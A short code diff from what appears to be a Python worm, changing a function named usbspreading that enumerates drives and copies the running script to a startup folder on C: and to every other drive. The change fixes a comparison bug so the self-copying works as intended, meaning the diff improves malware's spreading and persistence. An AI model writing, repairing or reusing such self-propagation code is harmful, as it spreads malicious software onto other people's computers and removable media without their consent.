@@ -171,7 +171,7 @@ def usbspreading():
         drives = drives.split('\000')[:-1]
         print(drives)
         for drive in drives:
-            if "C:\\" in drives:
+            if "C:\\" == drive:
                 copy2(__file__, bootfolder)
             else:
                 copy2(__file__, drive)
